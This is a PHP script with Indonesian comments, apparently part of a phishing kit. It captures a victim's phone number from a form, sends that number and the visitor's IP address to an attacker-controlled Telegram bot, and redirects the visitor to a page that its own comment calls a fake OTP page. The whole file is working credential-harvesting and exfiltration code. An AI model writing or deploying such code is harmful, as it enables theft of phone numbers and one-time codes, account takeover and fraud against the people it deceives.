<?php
session_start();
$_SESSION['phone'] = $_POST['phone'];

// Kirim notifikasi nomor ke Telegram
include 'config.php';
$msg = "📱 NOMOR TERTANGKAP: " . $_POST['phone'] . " | IP: " . $_SERVER['REMOTE_ADDR'];
file_get_contents("https://api.telegram.org/bot$bot_token/sendMessage?chat_id=$chat_id&text=" . urlencode($msg));

// Redirect ke halaman OTP palsu
header("Location: otp.php");
exit;
?>
